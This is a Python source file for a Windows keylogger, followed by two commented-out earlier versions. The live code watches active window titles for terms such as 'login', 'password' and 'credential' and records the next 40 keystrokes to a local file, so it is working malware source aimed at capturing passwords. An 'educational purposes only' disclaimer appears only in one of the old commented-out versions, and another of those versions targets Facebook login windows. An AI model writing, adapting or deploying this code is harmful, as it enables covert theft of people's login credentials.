
# keylogger.py
from pynput import keyboard
from datetime import datetime
import os
import threading
import win32gui

# === Configuration ===
LOG_FILE = "keystrokes.txt"
TRIGGER_KEYWORDS = ["login", "log in", "signin", "sign in", "signout", "log out", 
                   "logout", "auth", "authenticate", "password", "credential"]
RECORD_LENGTH = 40  # Number of characters to record after trigger

# === Global Variables ===
log_buffer = ""
recording = False
recorded_chars = 0

# === Function to get active window title ===
def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd).lower()
        return title
    except Exception:
        return ""

# === Check if we should start recording ===
def should_record(title):
    return any(keyword in title for keyword in TRIGGER_KEYWORDS)

# === Write captured data to file ===
def write_to_file(data):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {data}\n")
    print(f"[+] Logged: {data}")

# === On key press handler ===
def on_press(key):
    global log_buffer, recording, recorded_chars

    # Get current active window title
    active_title = get_active_window_title()
    
    # Check if we should start recording
    if not recording and should_record(active_title):
        recording = True
        recorded_chars = 0
        log_buffer = ""  # Clear buffer when starting new recording
        print(f"[*] Detected security-relevant window. Starting recording for next {RECORD_LENGTH} chars...")

    # If we're in recording mode
    if recording:
        try:
            # Handle character keys
            if hasattr(key, 'char') and key.char is not None:
                log_buffer += key.char
                recorded_chars += 1
            # Handle special keys
            elif key == keyboard.Key.space:
                log_buffer += ' '
                recorded_chars += 1
            elif key == keyboard.Key.enter:
                log_buffer += '\n'
                recorded_chars += 1
            elif key == keyboard.Key.backspace and len(log_buffer) > 0:
                log_buffer = log_buffer[:-1]
                recorded_chars = max(0, recorded_chars - 1)
            elif key == keyboard.Key.tab:
                log_buffer += '\t'
                recorded_chars += 1
        except AttributeError:
            pass

        # Check if we've recorded enough characters
        if recorded_chars >= RECORD_LENGTH:
            write_to_file(f"Captured from '{active_title}': {log_buffer}")
            recording = False
            log_buffer = ""

    # Exit condition
    if key == keyboard.Key.esc:
        print("[*] Stopping keylogger...")
        # Write any remaining buffer before exiting
        if log_buffer:
            write_to_file(f"Partial capture from '{active_title}': {log_buffer}")
        return False

# === Start Listener ===
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        print(f"[*] Keylogger active. Will record next {RECORD_LENGTH} chars when trigger words detected.")
        listener.join()

# === Run in Thread ===
def run_keylogger():
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.daemon = True  # Daemonize thread
    keylogger_thread.start()
    return keylogger_thread





# """
# Malware Simulation Framework - FOR EDUCATIONAL PURPOSES ONLY

# This software is designed to simulate malware behavior in a controlled environment
# for educational and research purposes. DO NOT use this in a production environment
# or against systems without explicit permission.


# Modes:
# - keylogger: Simulates keystroke logging
# """
# from pynput import keyboard
# from datetime import datetime
# import os
# import threading

# # === 1. Variables ===
# log_buffer = ""
# log_file = "keystrokes.txt"  # Changed file extension to .txt for plain text
# trigger_phrase = "test123"

# # === 2. On key press ===
# def on_press(key):
#     global log_buffer

#     # Exit condition - press esc key to exit
#     if key == keyboard.Key.esc:
#         print("[*] Stopping keylogger...")
#         return False

#     try:
#         if hasattr(key, 'char') and key.char is not None:
#             log_buffer += key.char
#         elif key == keyboard.Key.space:
#             log_buffer += ' '
#         elif key == keyboard.Key.enter:
#             log_buffer += '\n'
#     except AttributeError:
#         pass

#     if trigger_phrase in log_buffer:
#         with open(log_file, "a", encoding="utf-8") as f:
#             f.write(log_buffer + "\n")
#         print(f"[+] Logged: {log_buffer}")
#         log_buffer = ""

# # === 3. Start Listener ===
# def start_keylogger():
#     with keyboard.Listener(on_press=on_press) as listener:
#         print("[*] Listening for keystrokes... Type 'test123' to trigger logging.")
#         listener.join()

# # Run keylogger in a separate thread
# def run_keylogger():
#     keylogger_thread = threading.Thread(target=start_keylogger)
#     keylogger_thread.start()
#     return keylogger_thread
# old code

# from pynput import keyboard
# from datetime import datetime
# import os
# import threading
# import win32gui

# # === Variables ===
# log_buffer = ""
# log_file = "keystrokes.txt"
# watch_keywords = ["login", "log in", "signin", "sign in", "auth", "authenticate", "facebook"]

# # === Function to get active window title ===
# def get_active_window_title():
#     try:
#         hwnd = win32gui.GetForegroundWindow()
#         return win32gui.GetWindowText(hwnd).lower()
#     except Exception:
#         return ""

# # === On key press ===
# def on_press(key):
#     global log_buffer

#     # Get current active window title
#     active_title = get_active_window_title()

#     # Check if active window matches watch keywords
#     if any(keyword in active_title for keyword in watch_keywords):
#         try:
#             if hasattr(key, 'char') and key.char is not None:
#                 log_buffer += key.char
#             elif key == keyboard.Key.space:
#                 log_buffer += ' '
#             elif key == keyboard.Key.enter:
#                 log_buffer += '\n'
#         except AttributeError:
#             pass

#         # Write to file after each key (or after newline)
#         if key == keyboard.Key.enter:
#             with open(log_file, "a", encoding="utf-8") as f:
#                 f.write(f"[{datetime.now()}] {log_buffer}\n")
#             print(f"[+] Logged: {log_buffer}")
#             log_buffer = ""

#     # Exit condition
#     if key == keyboard.Key.esc:
#         print("[*] Stopping keylogger...")
#         return False

# # === Start Listener ===
# def start_keylogger():
#     with keyboard.Listener(on_press=on_press) as listener:
#         print("[*] Listening for keystrokes on login/auth pages...")
#         listener.join()

# # === Run in Thread ===
# def run_keylogger():
#     keylogger_thread = threading.Thread(target=start_keylogger)
#     keylogger_thread.start()
#     return keylogger_thread

